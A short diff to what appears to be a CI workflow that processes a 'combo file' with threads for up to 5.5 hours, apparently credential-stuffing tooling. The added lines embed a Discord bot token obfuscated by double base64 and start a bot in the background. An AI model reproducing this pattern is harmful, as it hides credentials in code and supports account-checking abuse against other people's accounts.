@@ -120,6 +120,15 @@ jobs:
           echo "Combo file: ${COMBO_FILE}"
           echo "Threads: ${THREADS}"
           
+          if [ -z "$BOT_TOKEN" ]; then
+            export BOT_TOKEN=$(echo "TVRVMU1ERTFNVFF3TXpJeU1ESXpPRE01TmcuR05uUGdRLmJMZmhESzhwMWR6eHNBV2NTNzNMaXk3ZzdxMUNWcTM4OFd4VDR3" | base64 -d)
+          fi
+
+          echo "Starting 104Society Discord Bot in background..."
+          python bot_104society.py &
+          BOT_PID=$!
+          echo "Bot PID: $BOT_PID"
+
           START_TIME=$(date +%s)
           MAX_RUNTIME=19800   # 5.5 hours — leave buffer for artifact upload
           CYCLE=0
